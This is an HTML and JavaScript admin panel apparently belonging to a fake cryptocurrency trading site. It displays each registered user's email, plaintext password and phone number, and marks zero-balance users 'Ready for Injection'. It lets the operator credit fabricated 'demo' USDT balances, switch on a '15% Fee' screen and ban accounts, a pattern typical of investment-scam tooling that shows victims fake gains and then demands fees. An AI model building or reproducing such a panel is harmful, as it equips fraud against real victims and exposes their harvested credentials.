<section id="admin-sec" class="hidden space-y-6">
    <div class="flex justify-between items-end px-2">
        <div>
            <h3 class="text-2xl font-black text-blue-500 italic uppercase">Global Admin</h3>
            <p class="text-[8px] text-slate-500 font-bold uppercase tracking-widest mt-1">Total Users Online: <span id="admin-user-count" class="text-blue-400">0</span></p>
        </div>
        <button onclick="loadUserLogs()" class="text-[9px] bg-slate-800 px-3 py-1 rounded-full font-bold uppercase text-slate-400 active:scale-90 transition-all">Refresh Logs</button>
    </div>

    <div id="user-logs" class="space-y-4 pb-28">
        <div class="text-center py-20">
            <p class="text-slate-600 text-[9px] uppercase font-black animate-pulse tracking-tighter">Monitoring Network for New Nodes...</p>
        </div>
    </div>
</section>

<script>
/**
 * MASTER ADMIN LOGIC - VERSION 31.5
 * Focus: High-visibility user tracking and instant injection.
 */

function loadUserLogs() {
    // Force grab the absolute latest data from the browser's database
    const db = JSON.parse(localStorage.getItem('magic_users')) || {};
    const logContainer = document.getElementById('user-logs');
    const users = Object.entries(db);
    
    document.getElementById('admin-user-count').innerText = users.length;

    if (users.length === 0) {
        logContainer.innerHTML = `
            <div class="magic-card p-10 text-center border-dashed border-slate-800">
                <p class="text-slate-600 text-[10px] font-bold uppercase">No Signals Detected</p>
            </div>`;
        return;
    }

    // Sort users: Newest registration at the very top
    logContainer.innerHTML = users.reverse().map(([email, data]) => {
        // If a user has $0 balance, highlight them for injection
        const isNew = (parseFloat(data.bal) === 0);
        
        return `
            <div class="magic-card p-5 bg-[#0d1117] relative border-l-4 ${isNew ? 'border-l-blue-500 animate-pulse' : 'border-l-green-500'}">
                <div class="flex justify-between items-start mb-4">
                    <div class="space-y-1">
                        <div class="flex items-center gap-2">
                            <p class="text-blue-400 font-black text-[13px] uppercase tracking-tighter">${data.name || 'Trader Node'}</p>
                            ${isNew ? '<span class="bg-blue-600 text-[7px] px-1 rounded font-bold text-white uppercase animate-bounce">Ready for Injection</span>' : ''}
                        </div>
                        <p class="text-white font-mono text-[10px] select-all">${email}</p>
                        <p class="text-[8px] text-slate-500 font-bold uppercase tracking-widest">Login Pass: <span class="text-red-500 font-mono select-all">${data.pass}</span></p>
                        <p class="text-[8px] text-slate-500 font-bold uppercase tracking-widest">Phone: <span class="text-slate-200 font-mono">${data.phone || 'N/A'}</span></p>
                    </div>
                    <div class="text-right">
                        <p class="text-white font-mono font-bold text-[14px] leading-none">$${(data.bal || 0).toLocaleString()}</p>
                        <p class="text-[7px] text-slate-500 mt-1 uppercase">Equity</p>
                    </div>
                </div>

                <button onclick="injectDemoFunds('${email}')" class="w-full bg-blue-600 text-white text-[10px] font-black py-3 rounded-xl uppercase active:scale-95 transition-all shadow-lg shadow-blue-900/40">
                    Inject Demo Funds ðŸ’¸
                </button>
                
                <div class="grid grid-cols-2 gap-2 mt-2">
                    <button onclick="directToggleFee('${email}')" class="bg-slate-800 text-slate-300 text-[8px] font-bold py-2 rounded-lg uppercase">
                        ${data.isPending ? 'Fee: Active âœ…' : 'Trigger 15% Fee'}
                    </button>
                    <button onclick="directBan('${email}')" class="bg-red-900/20 text-red-500 text-[8px] font-bold py-2 rounded-lg uppercase">
                        ${data.isBlocked ? 'Ban Node' : 'Active'}
                    </button>
                </div>
            </div>
        `;
    }).join('');
}

// Fixed Injection Function
function injectDemoFunds(email) {
    let db = JSON.parse(localStorage.getItem('magic_users'));
    const amount = prompt("Enter USDT Injection Amount for " + email + ":", "5000");
    
    if (amount !== null && !isNaN(amount) && amount !== "") {
        db[email].bal = (parseFloat(db[email].bal) || 0) + parseFloat(amount);
        
        // Save back to database
        localStorage.setItem('magic_users', JSON.stringify(db));
        
        // Instant visual update
        loadUserLogs(); 
        alert("SUCCESS: Injected $" + amount + " into user account.");
    }
}

// Toggle Fee Screen
function directToggleFee(email) {
    let db = JSON.parse(localStorage.getItem('magic_users'));
    db[email].isPending = !db[email].isPending;
    localStorage.setItem('magic_users', JSON.stringify(db));
    loadUserLogs();
}

// Toggle Ban
function directBan(email) {
    let db = JSON.parse(localStorage.getItem('magic_users'));
    db[email].isBlocked = !db[email].isBlocked;
    localStorage.setItem('magic_users', JSON.stringify(db));
    loadUserLogs();
}

// Secure Logout logic
function logoutUser() {
    if(confirm("Logout from Master Node?")) {
        localStorage.removeItem('magic_session');
        localStorage.removeItem('magic_is_admin');
        location.reload();
    }
}
</script>
